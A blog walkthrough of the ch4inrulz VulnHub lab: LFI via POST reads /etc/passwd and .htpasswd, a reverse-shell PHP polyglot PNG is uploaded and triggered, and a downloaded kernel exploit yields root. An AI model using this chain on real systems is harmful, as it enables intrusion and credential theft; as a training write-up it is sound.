---
layout: post
title: "Ch4inrulz hacking challenge"
date: 2018-08-19 03:52:29 -0400
comments: true
categories: boot2root
---

I had some extra free time this weekend so I picked a random boot2root from VulnHub. The lucky challenger was [ch4inrulz](https://www.vulnhub.com/entry/ch4inrulz-101,247/), a boot2root made for Jordan's Top Hacker 2018 CTF. The difficulty level is rated as intermediate. Perfect, let's-a-go as Mario's are wont to say. 

Enumeration time. As always I start with a full-on TCP portscan to see what shows up. 

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 172.16.27.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: FRANK's Website | Under development
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:F7:4D:66 (VMware)
```

FTP was open, but it turned out to be a dead end. Port 80 and 8011 were bit more promising. Both were running Apache, so I fired up Nikto, but nothing of interest showed up. I decided to do a directory and file scan to see if anything interesting turned up. I've gotten quite fond of [gobuster](https://github.com/OJ/gobuster) (gr33tz [OJ](https://twitter.com/TheColonial)!) for this sort of thing now. 

After waiting several minutes, I had results from both scans. Here's port 80: 

```
root@kali:~/pwn# gobuster -u http://172.16.27.142/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x html,php -s 200,301,401,403

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://172.16.27.142/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,301,401,403
[+] Extensions   : .html,.php
=====================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta.php (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd.php (Status: 403)
/LICENSE (Status: 200)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/css (Status: 301)
/development (Status: 401)
/img (Status: 301)
/index (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/vendor (Status: 301)
=====================================================
```

Great, some good results here. The development directory looked promising. Navigating to it resulted in a Basic-Authentication login prompt. I didn't have anything I could use at this point, so I just made a not of this. Otherwise, the website itself was relatively just about some guy named Frank. It's a username, so I kept note of it as well for later bruteforcing; should it come to that. 

And now for port 8011:

```
root@kali:~/pwn# gobuster -u http://172.16.27.142:8011/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x html,php -s 200,301,401,403

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://172.16.27.142:8011/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,301,401,403
[+] Extensions   : .html,.php
=====================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd.php (Status: 403)
/api (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
```

The api directory was another promising result. Going to this revealed that Frank had some API scripts setup to communicate with the server: 

```
root@kali:~/pwn# http http://172.16.27.142:8011/api/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 185
Content-Type: text/html
Date: Sun, 19 Aug 2018 20:38:09 GMT
ETag: "100541-15f-569cdcf0d24a9"
Keep-Alive: timeout=5, max=100
Last-Modified: Sat, 14 Apr 2018 12:05:46 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding

<title>FRANK's API | Under development</title>

<center><h2>This API will be used to communicate with Frank's server</h2></center>
<center><b>but it's still under development</b></center>
<center><p>* web_api.php</p></center>
<center><p>* records_api.php</p></center>
<center><p>* files_api.php</p></center>
<center><p>* database_api.php</p></center>
```

Out of all these API PHP scripts, only files_api.php seemed to exist:

```
root@kali:~/pwn# http http://172.16.27.142:8011/api/files_api.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 163
Content-Type: text/html
Date: Sun, 19 Aug 2018 20:38:47 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

<p>No parameter called file passed to me</p><p>* Note : this API don't use json , so send the file name in raw format</p>
```

You may be wondering why I'm not just using screenshots of the browser. The truth is I'm lazy. Alright, so file_api.php expects a parameter file that points to a file on the local filesystem. So this screamed local file inclusion. Giving it a go was a fail though:

```
root@kali:~/pwn# http http://172.16.27.142:8011/api/files_api.php?file=/etc/passwd
HTTP/1.0 500 Internal Server Error
Connection: close
Content-Encoding: gzip
Content-Length: 158
Content-Type: text/html
Date: Sun, 19 Aug 2018 20:41:57 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Pad: avoid browser bug
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

<b>********* HACKER DETECTED *********</b><p>YOUR IP IS : 172.16.27.143</p><p>WRONG INPUT !!</p>
```

What about a POST request though? 

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=/etc/passwd
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 481
Content-Type: text/html
Date: Sun, 19 Aug 2018 20:43:03 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false
```

Hello! So there's definitely a local file inclusion vulnerability. So what to look for? I wanted to know what was up with that development page that was protected with Basic-Authentication. Usually that means there's a .htaccess in there, so I pulled that down:

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=/var/www/development/.htaccess
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 187
Content-Type: text/html
Date: Sun, 19 Aug 2018 22:36:57 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

AuthUserFile /etc/.htpasswd
AuthName "Frank Development Area"
AuthType Basic
AuthGroupFile /dev/null

<Limit GET POST>

require valid-user

</Limit>
```

It looks like the hashed password is stored in /etc/.htpasswd. Let's pull that down:

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=/etc/.htpasswd
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 125
Content-Type: text/html
Date: Sun, 19 Aug 2018 22:38:35 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
```

Excellent. Let's see if we can crack that.

```
root@kali:~/pwn# echo 'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0' > hashes
root@kali:~/pwn# john hashes
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)
root@kali:~/pwn# john --show hashes
frank:frank!!!

1 password hash cracked, 0 left
```

So that password for frank is frank!!!. With that information I could now check out the development page. 

```
root@kali:~/pwn# http --auth 'frank:frank!!!' http://172.16.27.142/development/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 131
Content-Type: text/html
Date: Sun, 19 Aug 2018 22:40:30 GMT
ETag: "100dd2-90-569cf89f67548"
Keep-Alive: timeout=5, max=100
Last-Modified: Sat, 14 Apr 2018 14:09:37 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding

<title>my Development tools</title>
<b>* Here is my unfinished tools list</b>

<h4>- the uploader tool (finished but need security review)</h4>
```

The uploader tool is surprisingly called, uploader, and is located at http://172.16.27.142/development/uploader/

```
root@kali:~/pwn# http --auth 'frank:frank!!!' http://172.16.27.142/development/uploader/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 523
Content-Type: text/html
Date: Sun, 19 Aug 2018 23:29:03 GMT
ETag: "100d1d-4a3-569c414cdf059"
Keep-Alive: timeout=5, max=100
Last-Modified: Sat, 14 Apr 2018 00:29:27 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<head>
    <!-- Bootstrap core CSS -->
    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:100,200,300,400,500,600,700,800,900" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <link href="../vendor/devicons/css/devicons.min.css" rel="stylesheet">
    <link href="../vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../css/resume.min.css" rel="stylesheet">


</head>
<body>

<h2>Frank Uploader Script beta version</h2>
<br>
<br>
<hr>

<form action="upload.php" method="post" enctype="multipart/form-data">
    <p>Select image to upload:</p>
    <p><input type="file" name="fileToUpload" id="fileToUpload"></p>
    <p><input type="submit" value="Upload Image" name="submit"></p>
</form>
<b>TODO : script security "50% FINISHED"</b>
</body>
</html>
```

So it calls upload.php to upload an image onto the server. At this point I'm thinking it's probably possible to somehow upload a webshell onto the server using this utility. It would be useful to know what upload.php does though:

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=/var/www/development/uploader/upload.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 149
Content-Type: text/html
Date: Sun, 19 Aug 2018 23:33:25 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded.
```

That didn't work. Perhaps with PHP filters instead:

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=php://filter/convert.base64-encode/resource=/var/www/development/uploader/upload.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 1018
Content-Type: text/html
Date: Sun, 19 Aug 2018 23:33:22 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.10-1ubuntu3.26

<head>
  <title>franks website | simple website browser API</title>
</head>

PD9waHAKJHRhcmdldF9kaXIgPSAiRlJBTkt1cGxvYWRzLyI7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7CiR1cGxvYWRPayA9IDE7CiRpbWFnZUZpbGVUeXBlID0gc3RydG9sb3dlcihwYXRoaW5mbygkdGFyZ2V0X2ZpbGUsUEFUSElORk9fRVhURU5TSU9OKSk7Ci8vIENoZWNrIGlmIGltYWdlIGZpbGUgaXMgYSBhY3R1YWwgaW1hZ2Ugb3IgZmFrZSBpbWFnZQppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJGNoZWNrID0gZ2V0aW1hZ2VzaXplKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmKCRjaGVjayAhPT0gZmFsc2UpIHsKICAgICAgICBlY2hvICJGaWxlIGlzIGFuIGltYWdlIC0gIiAuICRjaGVja1sibWltZSJdIC4gIi4iOwogICAgICAgICR1cGxvYWRPayA9IDE7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkZpbGUgaXMgbm90IGFuIGltYWdlLiI7CiAgICAgICAgJHVwbG9hZE9rID0gMDsKICAgIH0KfQovLyBDaGVjayBpZiBmaWxlIGFscmVhZHkgZXhpc3RzCmlmIChmaWxlX2V4aXN0cygkdGFyZ2V0X2ZpbGUpKSB7CiAgICBlY2hvICJTb3JyeSwgZmlsZSBhbHJlYWR5IGV4aXN0cy4iOwogICAgJHVwbG9hZE9rID0gMDsKfQovLyBDaGVjayBmaWxlIHNpemUKaWYgKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJzaXplIl0gPiA1MDAwMDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgaXMgdG9vIGxhcmdlLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIEFsbG93IGNlcnRhaW4gZmlsZSBmb3JtYXRzCmlmKCRpbWFnZUZpbGVUeXBlICE9ICJqcGciICYmICRpbWFnZUZpbGVUeXBlICE9ICJwbmciICYmICRpbWFnZUZpbGVUeXBlICE9ICJqcGVnIgomJiAkaW1hZ2VGaWxlVHlwZSAhPSAiZ2lmIiApIHsKICAgIGVjaG8gIlNvcnJ5LCBvbmx5IEpQRywgSlBFRywgUE5HICYgR0lGIGZpbGVzIGFyZSBhbGxvd2VkLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIENoZWNrIGlmICR1cGxvYWRPayBpcyBzZXQgdG8gMCBieSBhbiBlcnJvcgppZiAoJHVwbG9hZE9rID09IDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgd2FzIG5vdCB1cGxvYWRlZC4iOwovLyBpZiBldmVyeXRoaW5nIGlzIG9rLCB0cnkgdG8gdXBsb2FkIGZpbGUKfSBlbHNlIHsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICAgICBlY2hvICJUaGUgZmlsZSAiLiBiYXNlbmFtZSggJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkuICIgaGFzIGJlZW4gdXBsb2FkZWQgdG8gbXkgdXBsb2FkcyBwYXRoLiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS4iOwogICAgfQp9Cj8+Cgo=
```

Much better. Base64 decoding that string reveals the contents of the php file: 

```
<?php
$target_dir = "FRANKuploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded to my uploads path.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?>
```

So basically it uses getimagesize() to determine if the file being uploaded is an image, and then it checks if the file is under a certain size, and finally, whether it had an image extension; in this case jpg, jpeg, png, or gif. It's easy to get around these checks. I just had to concatenate my PHP webshell into a legitimate image and then upload it. In this case I opted to use /usr/share/webshells/php/php-reverse-shell.php in Kali Linux. I updated it to connect back to my Kali instance on port 443. I just searched for some PNG file on my system and chose to append the PHP webshell to that. 

```
root@kali:~/pwn# cp /etc/alternatives/start-here-32.png shell.png
root@kali:~/pwn# cat /usr/share/webshells/php/php-reverse-shell.php >> shell.png
root@kali:~/pwn# file shell.png
shell.png: PNG image data, 32 x 32, 8-bit/color RGBA, non-interlaced
```

Once that was done, I went ahead and uploaded the file. The following text indicated that it was accepted:

```
File is an image - image/png.The file shell.png has been uploaded to my uploads path. 
```

Based on the upload.php source code, we see that it uploads it to FRANKuploads. So let's have a look:

```
root@kali:~/pwn# http --auth 'frank:frank!!!' http://172.16.27.142/development/uploader/FRANKuploads/
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 472
Content-Type: text/html;charset=UTF-8
Date: Mon, 20 Aug 2018 02:15:10 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /development/uploader/FRANKuploads</title>
 </head>
 <body>
<h1>Index of /development/uploader/FRANKuploads</h1>
<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[DIR]"></td><td><a href="/development/uploader/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="shell.png">shell.png</a></td><td align="right">19-Aug-2018 19:13  </td><td align="right">6.6K</td><td>&nbsp;</td></tr>
<tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.2.22 (Ubuntu) Server at 172.16.27.142 Port 80</address>
</body></html>
```

Ok it looks a bit messy, but we can see that my uploaded shell.png is on there. Downloading the image isn't going to trigger the PHP file, but reading its contents will. This can be done through the local file inclusion vulnerability. First off, I started a netcat listener on port 443 to catch incoming reverse shell. Then pulled down the file's contents to execute the PHP shell:

```
root@kali:~/pwn# http --form POST  http://172.16.27.142:8011/api/files_api.php file=/var/www/development/uploader/FRANKuploads/shell.png
```

And sure enough on my netcat listener I received a non-privileged user shell as www-data:

```
root@kali:~/pwn# nc -lvp 443
listening on [any] 443 ...
172.16.27.142: inverse host lookup failed: Unknown host
connect to [172.16.27.143] from (UNKNOWN) [172.16.27.142] 41275
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 19:17:25 up  6:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$
```

The first flag can be found in /home/frank:

```
$ ls -l /home/frank
total 8
-rw-r--r-- 1 frank frank 29 Apr 14 07:37 PE.txt
-rw-r--r-- 1 frank frank 33 Apr 14 07:36 user.txt
$ cat /home/frank/user.txt
4795aa2a9be22fac10e1c25794e75c1b
$
```

There was also a /home/frank/PE.txt. No idea what it was for. Maybe it was a hint on how to proceed, I don't know:

```
$ cat /home/frank/PE.txt
Try it as fast as you can ;)
$
```

I started enumerating the system from the inside and found that it was running a super old version of Ubuntu. 

```
$ uname -a
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
$ lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu maverick (development branch)
Release:        10.10
Codename:       maverick
No LSB modules are available.
$
```

A kernel that old was surely vulnerable to some kind of kernel exploit. I used [https://github.com/manasmbellani/kernel-exploits](https://github.com/manasmbellani/kernel-exploits) to look for potential kernel exploits for this kernel version. The beauty of that repository is that it comes with pre-compiled exploits. Whether you choose to trust that or not is up to you. Since this is just a boot2root running in a host-only VM, I didn't really care. First exploit I tried work, which was ptrace-kmod2-64. I'm sure some of the others there would have worked as well. 

I downloaded the pre-compiled binary to my Kali instance, setup a http listener with python, and downloaded it from the ch4inrulz VM. On Kali:

```
root@kali:~/pwn# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
```

And then on my reverse shell:

```
$ wget http://172.16.27.143:8080/ptrace_kmod2-64
--2018-08-19 19:27:22--  http://172.16.27.143:8080/ptrace_kmod2-64
Connecting to 172.16.27.143:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 689999 (674K) [application/octet-stream]
Saving to: `ptrace_kmod2-64'

     0K .......... .......... .......... .......... ..........  7% 21.8M 0s
    50K .......... .......... .......... .......... .......... 14% 36.3M 0s
   100K .......... .......... .......... .......... .......... 22% 20.9M 0s
   150K .......... .......... .......... .......... .......... 29% 95.4M 0s
   200K .......... .......... .......... .......... .......... 37% 14.3M 0s
   250K .......... .......... .......... .......... .......... 44% 81.5M 0s
   300K .......... .......... .......... .......... .......... 51%  412M 0s
   350K .......... .......... .......... .......... .......... 59% 19.8M 0s
   400K .......... .......... .......... .......... .......... 66% 35.3M 0s
   450K .......... .......... .......... .......... .......... 74% 56.8M 0s
   500K .......... .......... .......... .......... .......... 81% 18.1M 0s
   550K .......... .......... .......... .......... .......... 89%  183M 0s
   600K .......... .......... .......... .......... .......... 96%  312M 0s
   650K .......... .......... ...                             100%  247M=0.02s

2018-08-19 19:27:22 (35.6 MB/s) - `ptrace_kmod2-64' saved [689999/689999]

$ chmod 755 ptrace_kmod2-64
```

Ok, moment of truth. 

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ./ptrace_kmod2-64
id
uid=0(root) gid=0(root) groups=0(root)
```

Success! Getting root on this machine was pretty easy. All that was left was to grab the final flag: 

```
ls -l /root
total 4
-rw-r--r-- 1 root root 33 Apr 14 07:36 root.txt
cat /root/root.txt
8f420533b79076cc99e9f95a1a4e5568
```

And that's that! Ch4inrulz was a fairly easy challenge overall. 
